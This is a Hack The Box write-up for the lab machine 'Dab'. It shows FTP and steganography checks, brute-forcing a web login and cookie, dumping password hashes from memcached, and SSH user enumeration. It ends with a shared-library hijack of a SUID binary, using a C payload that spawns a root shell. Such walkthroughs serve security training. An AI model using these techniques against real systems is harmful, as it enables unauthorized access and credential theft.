<hr />

<h2 id="quick-summary">Quick Summary</h2>
<p><br /> Hey guys today dab retired and this is my write-up. Dab was a nice box ,A hard one but it had some funny stuff too , getting user was really annoying because it had a lot of rabbit holes. Root was much better. It’s a linux box and it’s ip is 10.10.10.86 so let’s jump right in.
<img src="/images/hackthebox/dab/0.png" alt="" /></p>
<hr />

<h2 id="nmap">Nmap</h2>
<p><br /> As always we will start by running nmap 
<br /> note : I added the ip to <code class="highlighter-rouge">/etc/hosts</code> as dab.htb
<code class="highlighter-rouge">nmap -sV -sT -sC dab.htb</code>
<img src="/images/hackthebox/dab/1.png" alt="" />
<br /> We find ftp on port 21 , ssh on port 22 , http on port 80 and 8080 both of them are nginx.
<br /> Let’s take a look at the ftp server.
<br /></p>
<hr />

<h2 id="ftp">FTP</h2>
<p><br /> anonymous login succeeds , then by listing the files we only see one file <code class="highlighter-rouge">dab.jpg</code>
<img src="/images/hackthebox/dab/2.png" alt="" />
<br /> We will download it <code class="highlighter-rouge">get dab.jpg</code> then we will take a look at that image.
<img src="/images/hackthebox/dab/dab.jpg" alt="" />
<br /> Nothing really special , maybe steganography ? Let’s try steghide 
<code class="highlighter-rouge">steghide info dab.jpg</code>
<img src="/images/hackthebox/dab/3.png" alt="" />
<br /> And for password I left it blank and it was accepted !
<br /> Next step is to extract that txt file 
<code class="highlighter-rouge">steghide extract -sf dab.jpg</code>
<img src="/images/hackthebox/dab/4.png" alt="" />
<br /> Cool let’s <code class="highlighter-rouge">cat</code> it.
<img src="/images/hackthebox/dab/5.png" alt="" />
<br /> And , Nope…
<br /> So we just got trolled , next thing is to look at http
<br /> Check out my <a href="/lists/stego">steganography list</a>
<br /></p>
<hr />

<h2 id="http">HTTP</h2>
<p><br /> On port 80 there’s a login page.
<img src="/images/hackthebox/dab/6.png" alt="" />
<br /> And port 8080 tells us : <code class="highlighter-rouge">Access denied: password authentication cookie not set</code>
<img src="/images/hackthebox/dab/7.png" alt="" />
<br /> Bruteforcing sub directories with gobuster wasn’t helpful , port 80 had only <code class="highlighter-rouge">/login</code> and <code class="highlighter-rouge">/login</code>. Normal stuff
<img src="/images/hackthebox/dab/8.png" alt="" />
<br /> And port 8080 had nothing.
<img src="/images/hackthebox/dab/9.png" alt="" /></p>
<hr />

<h2 id="http-port-80">HTTP port 80</h2>
<p><br /> Let’s enumerate the first port and see what we can get.
<br /> The most common credentials <code class="highlighter-rouge">admin:admin</code> didn’t work and we get <code class="highlighter-rouge">Error: Login failed</code>
<img src="/images/hackthebox/dab/10.png" alt="" />
<br /> If we intercept the request with burp we will see that the login process is being handled through a POST request with the parameters <code class="highlighter-rouge">username</code> and <code class="highlighter-rouge">password</code>
<img src="/images/hackthebox/dab/11.png" alt="" />
<br /> At this point we can bruteforce passwords with hydra , but instead of that i just used ZAP fuzzer , you can also use burp intruder but it’s very slow in the community version.
<br /></p>
<hr />

<h2 id="fuzzing-with-zap">Fuzzing with ZAP</h2>
<p><br /> First thing to mention is the wordlist , because we are bruteforcing remotely it’s better to use a small wordlist so we won’t use rockyou here. I used <a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/darkweb2017-top10000.txt">darkweb2017-top10000.txt</a> from <a href="https://github.com/danielmiessler/SecLists">Seclists</a>
<br /> Let’s start zap and intercept the request again.
<img src="/images/hackthebox/dab/12.png" alt="" />
<br /> Then right click –&gt; attack –&gt; fuzzer . After that we highlight the place we want to fuzz , that will be the password parameter value.
<img src="/images/hackthebox/dab/13.png" alt="" />
<br /> Add –&gt; Add then we paste the wordlist contents.
<img src="/images/hackthebox/dab/14.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/dab/15.png" alt="" />
<br /> all the responses will be <code class="highlighter-rouge">200</code> and 542 bytes , except one response <code class="highlighter-rouge">302</code> and 209 bytes , for the value <code class="highlighter-rouge">Password1</code> so that’s the password.
<img src="/images/hackthebox/dab/16.png" alt="" />
<br /> And we get it in , but … 
<img src="/images/hackthebox/dab/17.png" alt="" />
<br /> Nothing interesting , was this port important ? correct me if i’m wrong.
<br /></p>
<hr />

<h2 id="http-port-8080">HTTP port 8080</h2>
<p><br /> Moving on to the next http port , let’s intercept the request with burp and see what can we do with that password authentication cookie.
<img src="/images/hackthebox/dab/18.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/dab/19.png" alt="" />
<br /> Let’s add a cookie and name it password , value can be anything we’re just testing
<img src="/images/hackthebox/dab/20.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/dab/21.png" alt="" />
<br /> We got another message : <code class="highlighter-rouge">Access denied: password authentication cookie incorrect</code>
<br /> So we just need to get the right value of the cookie and we will get in.
<br /> We will use wfuzz to fuzz the cookie 
<code class="highlighter-rouge">wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ</code>
<br /> Then we will terminate it immediately and look how can we filter the output
<img src="/images/hackthebox/dab/22.png" alt="" />
<br /> All the responses has <code class="highlighter-rouge">324 chars</code> so we will add <code class="highlighter-rouge">--hh 324</code> and this will not show us any response with 324 chars
<code class="highlighter-rouge">wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ --hh 324</code>
<img src="/images/hackthebox/dab/23.png" alt="" />
<br /> <code class="highlighter-rouge">secret</code> gave us a response of 540 , let’s try in burp
<img src="/images/hackthebox/dab/24.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/dab/25.png" alt="" />
<br /> next step is to add the cookie , you can use any cookie editor. after that we get this page.
<img src="/images/hackthebox/dab/26.png" alt="" />
<br /> Finally we got something
<br /></p>
<hr />

<h2 id="memcached">memcached</h2>
<p><br /> The very first thing we see is : “Status of cache engine: Online”
<br /> cache engine ? after some googling we will find a software called memcached
<br /> <a href="https://downloads.mysql.com/docs/mysql-memcached-en.a4.pdf">https://downloads.mysql.com/docs/mysql-memcached-en.a4.pdf</a></p>
<blockquote>
  <p>memcached is a simple, highly scalable key-based cache that stores data and objects wherever dedicated or spare RAM is available for quick access by applications, without going through layers of parsing or disk I/O. To use, you run the memcached command on one or more hosts and then use the shared cache to store objects.
 -page 1</p>
</blockquote>

<p><br />
<br /></p>

<blockquote>
  <p>By default, memcached uses the following settings:
•  Memory allocation of 64MB
•  Listens for connections on all network interfaces, using port 11211
•  Supports a maximum of 1024 simultaneous connections
 -page 5</p>
</blockquote>

<p><br />
<br />
<br /> So we know that memcached runs on port 11211 , let’s try any port to test
<img src="/images/hackthebox/dab/27.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/dab/28.png" alt="" />
<br /> We get an internal server error
<br /> Now let’s try port 11211
<img src="/images/hackthebox/dab/29.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/dab/30.png" alt="" />
<br /> We get <code class="highlighter-rouge">output : ERROR</code> because we didn’t send a valid command , but that’s a confirmation that the port is right.
<br /> Now we need to know what to put in “line to send”
<br /> By looking at this <a href="https://lzone.de/cheat-sheet/memcached">cheat sheet</a> , the first command we see is <code class="highlighter-rouge">get</code> which reads a value , first time i did this box i guessed it , just typed <code class="highlighter-rouge">get users</code> and it worked but the right way to do it is to query the memory statistics with <code class="highlighter-rouge">stats slabs</code> (as mentioned in the cheat sheet)
<img src="/images/hackthebox/dab/31.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/dab/32.png" alt="" />
<br /> Full output :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>STAT 1:chunk_size 96
STAT 1:chunks_per_page 10922
STAT 1:total_pages 1
STAT 1:total_chunks 10922
STAT 1:used_chunks 0
STAT 1:free_chunks 10922
STAT 1:free_chunks_end 0
STAT 1:mem_requested 0
STAT 1:get_hits 0
STAT 1:cmd_set 0
STAT 1:delete_hits 0
STAT 1:incr_hits 0
STAT 1:decr_hits 0
STAT 1:cas_hits 0
STAT 1:cas_badval 0
STAT 1:touch_hits 0
STAT 16:chunk_size 2904
STAT 16:chunks_per_page 361
STAT 16:total_pages 1
STAT 16:total_chunks 361
STAT 16:used_chunks 1
STAT 16:free_chunks 360
STAT 16:free_chunks_end 0
STAT 16:mem_requested 2880
STAT 16:get_hits 0
STAT 16:cmd_set 2
STAT 16:delete_hits 0
STAT 16:incr_hits 0
STAT 16:decr_hits 0
STAT 16:cas_hits 0
STAT 16:cas_badval 0
STAT 16:touch_hits 0
STAT 26:chunk_size 27120
STAT 26:chunks_per_page 38
STAT 26:total_pages 1
STAT 26:total_chunks 38
STAT 26:used_chunks 1
STAT 26:free_chunks 37
STAT 26:free_chunks_end 0
STAT 26:mem_requested 24699
STAT 26:get_hits 440
STAT 26:cmd_set 7
STAT 26:delete_hits 0
STAT 26:incr_hits 0
STAT 26:decr_hits 0
STAT 26:cas_hits 0
STAT 26:cas_badval 0
STAT 26:touch_hits 0
STAT active_slabs 3
STAT total_malloced 3127416
END

</code></pre></div></div>
<p><br /> By looking at the slab with id 26 we see that the chunk size of it is 27120 , let’s dump the keys for this slab 
<code class="highlighter-rouge">stats cachedump 26 0</code><br />
<br /> 0 for no result limit
<img src="/images/hackthebox/dab/33.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/dab/34.png" alt="" />
<br /> We get ITEM users
<br /> So we do <code class="highlighter-rouge">get users</code> , however you can just guess it like I said. We get a huge json output of usernames and password hashes.
<img src="/images/hackthebox/dab/35.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/dab/36.png" alt="" /></p>
<hr />

<h2 id="ssh-enumeration-and-getting-user">SSH enumeration and getting user</h2>
<p><br /> Let’s copy that output and save it on our box. I saved it in a file and called it users.txt
<code class="highlighter-rouge">cat users.txt</code>
<img src="/images/hackthebox/dab/37.png" alt="" />
<br /> And it’s a lot of unorganized data , 3 or more pages like this.
<br /> we will use a python module called json.tool to get a more clear output
<code class="highlighter-rouge">cat users.txt | python -m json.tool &gt; users2.txt</code>
<br />
<br />
<code class="highlighter-rouge">cat users2.txt</code>
<img src="/images/hackthebox/dab/38.png" alt="" />
<br /> And it’s nice now. Let’s make a seperate file for users to use them as a list to bruteforce ssh , and another seperate file for hashes to crack them.
<code class="highlighter-rouge">cat users2.txt | cut -d ":" -f 1 | cut -d '"' -f 2 &gt; usernames.txt</code>
<br />
<br />
<code class="highlighter-rouge">cat users2.txt | cut -d ":" -f 2 | cut -d '"' -f 2 &gt; hashes.txt</code>
<img src="/images/hackthebox/dab/39.png" alt="" />
<br /> To bruteforce ssh we will use a metasploit module called <code class="highlighter-rouge">ssh_enumusers</code> 
<code class="highlighter-rouge">msfconsole</code>
<br />
<br />
<code class="highlighter-rouge">use auxiliary/scanner/ssh/ssh_enumusers</code>
<br />
<br />
<code class="highlighter-rouge">set RHOSTS dab.htb</code>
<br />
<br />
<code class="highlighter-rouge">set USER_FILE usernames.txt</code>
<br />
<br />
<code class="highlighter-rouge">set THREADS 20</code>
<img src="/images/hackthebox/dab/40.png" alt="" />
<br /> It will run for a while , then it will tell us that it found the user <code class="highlighter-rouge">genevieve</code>
<img src="/images/hackthebox/dab/41.png" alt="" />
<br /> now we need to get the password of that user. You can use john , hashcat or online crackers , however I have already cracked them and only few ones are crackable : 
<img src="/images/hackthebox/dab/42.png" alt="" />
<br /> Now we need to know which one of these passwords is genevieve’s password , so we will grep for genevieve in <code class="highlighter-rouge">users2.txt</code> then we will grep for the hash in <code class="highlighter-rouge">cracked-hashes.txt</code>
<img src="/images/hackthebox/dab/43.png" alt="" />
<br /> And finally we have valid credentials <code class="highlighter-rouge">genevieve:Princess1</code> , let’s ssh
<img src="/images/hackthebox/dab/44.png" alt="" />
<br /> Finally , we owned user !
<br /></p>
<hr />

<h2 id="more-enumeration">More enumeration</h2>
<p><br /> We have a password , let’s try <code class="highlighter-rouge">sudo -l</code> , and we see that we can run this binary as root <code class="highlighter-rouge">/usr/bin/try_harder</code> , and as the name said … we should really try harder.
<img src="/images/hackthebox/dab/45.png" alt="" />
<br /> It gets us a root shell then immediately dies after the first command. We got trolled again :D
<br /> <code class="highlighter-rouge">find / -perm -4000</code> to search for suid binaries and we see something unusual.
<img src="/images/hackthebox/dab/46.png" alt="" />
<br /> A binary called <code class="highlighter-rouge">myexec</code> has suid permissions. Let’s see what’s that.
<img src="/images/hackthebox/dab/47.png" alt="" />
<br /> It asks for a password and of course “test” is refused , we need to reverse engineer this binary to find the password.
<br /></p>
<hr />

<h2 id="getting-the-password">Getting the password</h2>
<p><br /> <code class="highlighter-rouge">scp genevieve@dab.htb:/usr/bin/myexec /root/Desktop/HTB/boxes/dab</code> to download the file on our box
<img src="/images/hackthebox/dab/48.png" alt="" />
<br /> Then we will use radare2
<code class="highlighter-rouge">radare2 myexec</code>
<br />
<br />
<code class="highlighter-rouge">aaa</code>
<br />
<br />
<code class="highlighter-rouge">pdf @ main</code>
<img src="/images/hackthebox/dab/49.png" alt="" />
<br /> The password is <code class="highlighter-rouge">s3cur3l0g1n</code> , let’s get back to the box and try it 
<img src="/images/hackthebox/dab/50.png" alt="" />
<br /> And we get:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>password is correct 
seclogin() called
TODO: Placeholder for now, function not implemented yet
</code></pre></div></div>
<p><br /> so what can we do now ?
<br /></p>
<hr />

<h2 id="hijacking-dynamically-linked-shared-object-library-and-getting-root">Hijacking dynamically linked shared object library and getting root</h2>
<p><br /> If we run ldd (List Dynamic Dependencies) against that binary. we see libseclogin.so
<img src="/images/hackthebox/dab/51.png" alt="" />
<br /> and we saw earlier when we executed the binary : <code class="highlighter-rouge">seclogin() called</code>
<br /> So theoretically , if we can replace <code class="highlighter-rouge">libseclogin.so</code> with another one and link to it , the binary will execute it as root. let’s test that.
<br /> We will create a directory in <code class="highlighter-rouge">/home/genevieve/</code> and call it <code class="highlighter-rouge">.exploit</code>
<br /> Then we will write a small c program that spawns bash.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;

seclogin() {
setgid(0);
setuid(0);
system("/bin/bash");
}
</code></pre></div></div>
<p><img src="/images/hackthebox/dab/52.png" alt="" />
<br /> After that we will compile it 
<code class="highlighter-rouge">gcc -fPIC -shared -o libseclogin.so exploit.c</code>
<br /> Now our fake <code class="highlighter-rouge">libseclogin.so</code> is ready , we need to make the system point to our path <code class="highlighter-rouge">/home/genevieve/.exploit/libseclogin.so</code> instead of <code class="highlighter-rouge">/usr/lib/libseclogin.so</code>
<br /> We will <code class="highlighter-rouge">cd</code> to <code class="highlighter-rouge">/etc/ld.so.conf.d</code> , and create a <code class="highlighter-rouge">.conf</code> file and put our path in it.
<img src="/images/hackthebox/dab/53.png" alt="" />
<br /> Then to activate that path we will execute this command <code class="highlighter-rouge">ldconfig</code>
<br /> <a href="https://www.cyberciti.biz/faq/linux-setting-changing-library-path/">This page</a> helped a lot. 
<br /> Let’s do <code class="highlighter-rouge">ldd</code> again:
<img src="/images/hackthebox/dab/54.png" alt="" />
<br /> The path changed and pointed to our fake library.
<br /> Let’s own root.
<code class="highlighter-rouge">./myexec</code>
<img src="/images/hackthebox/dab/55.png" alt="" />
<br /> And we owned root.
<br />
<br />
<br /> That’s it , Feedback is appreciated !
<br /> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a>
<br /> Thanks for reading.
<br />
<br />
<br /> Previous Hack The Box write-up : <a href="/hack-the-box/secnotes/">Hack The Box - Secnotes</a>
<br /> Next Hack The Box write-up : <a href="/hack-the-box/ypuffy/">Hack The Box - Ypuffy</a></p>
<hr />

